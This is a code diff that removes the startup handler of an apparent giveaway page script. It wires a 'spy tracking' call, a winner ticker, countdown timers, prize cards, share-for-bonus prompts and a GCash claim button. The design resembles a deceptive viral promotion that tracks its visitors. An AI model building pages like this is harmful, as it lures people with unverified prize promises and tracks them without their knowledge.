-document.addEventListener('DOMContentLoaded', async function() {
-    console.log("Promotion.js loaded - Card Click Edition");
-    
-    // Init sound effects
-    soundEffects.init();
-    
-    // Spy tracking
-    await spyTracker.track();
-    
-    // Start winner ticker (FIXED)
-    winnerTicker.start();
-    
-    // Start main timer (FIXED)
-    startMainTimer();
-    
-    // Check existing cooldown
-    checkExistingCooldown();
-    
-    // Load card click status
-    await checkCardClickStatus();
-    
-    // Load current step from Firebase
-    const { step, isOnHold } = await indicatorSystem.loadFromFirebase();
-    console.log(`Current step: ${step}, On Hold: ${isOnHold}`);
-    
-    // Update progress bar based on step
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) {
-        if (step >= 3) progressFill.style.width = '100%';
-        else if (step >= 2) progressFill.style.width = '66%';
-        else if (step >= 1) progressFill.style.width = '33%';
-    }
-    
-    // Setup You Get Card click
-    const youGetCard = document.querySelector('.prize-card:first-child');
-    if (youGetCard && !youGetClicked) {
-        youGetCard.addEventListener('click', handleYouGetClick);
-        youGetCard.style.cursor = 'pointer';
-        youGetCard.style.transition = 'all 0.3s ease';
-        
-        // Hover effect
-        youGetCard.addEventListener('mouseenter', () => {
-            if (!youGetClicked) {
-                youGetCard.style.transform = 'scale(1.02)';
-                youGetCard.style.borderColor = '#ffd700';
-            }
-        });
-        youGetCard.addEventListener('mouseleave', () => {
-            if (!youGetClicked) {
-                youGetCard.style.transform = 'scale(1)';
-                youGetCard.style.borderColor = 'rgba(255,215,0,0.2)';
-            }
-        });
-    }
-    
-    // Setup Friend Gets Card click
-    const friendGetsCard = document.querySelector('.prize-card:last-child');
-    if (friendGetsCard && !friendGetsClicked) {
-        friendGetsCard.addEventListener('click', handleFriendGetsClick);
-        friendGetsCard.style.cursor = 'pointer';
-        friendGetsCard.style.transition = 'all 0.3s ease';
-        
-        // Hover effect
-        friendGetsCard.addEventListener('mouseenter', () => {
-            if (!friendGetsClicked) {
-                friendGetsCard.style.transform = 'scale(1.02)';
-                friendGetsCard.style.borderColor = '#ffd700';
-            }
-        });
-        friendGetsCard.addEventListener('mouseleave', () => {
-            if (!friendGetsClicked) {
-                friendGetsCard.style.transform = 'scale(1)';
-                friendGetsCard.style.borderColor = 'rgba(255,215,0,0.2)';
-            }
-        });
-    }
-    
-    // Share button
-    const shareBtn = document.getElementById('shareButton');
-    if (shareBtn) {
-        const newShareBtn = shareBtn.cloneNode(true);
-        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
-        newShareBtn.onclick = handleShare;
-        newShareBtn.disabled = referralTimer.isOnCooldown();
-    }
-    
-    // Facebook share button
-    const fbShareBtn = document.getElementById('shareFBBtn');
-    if (fbShareBtn) {
-        if (!document.querySelector('.fb-share-info')) {
-            const infoText = document.createElement('div');
-            infoText.className = 'fb-share-info';
-            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
-            infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
-            fbShareBtn.parentNode.appendChild(infoText);
-        }
-        
-        fbShareBtn.onclick = handleFacebookShare;
-    }
-    
-    // Claim button
-    const claimGCashBtn = document.getElementById('claimGCashBtn');
-    if (claimGCashBtn) {
-        claimGCashBtn.onclick = handleClaimGCash;
-    }
-    
-    // Popup close on outside click
-    const popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.onclick = function(e) {
-            if (e.target === popup) {
-                closePrizePopup();
-            }
-        };
-    }
-    
-    console.log("✅ Promotion.js initialized - Card clicks ready");
-});
+</script>
+</body>
+</html>
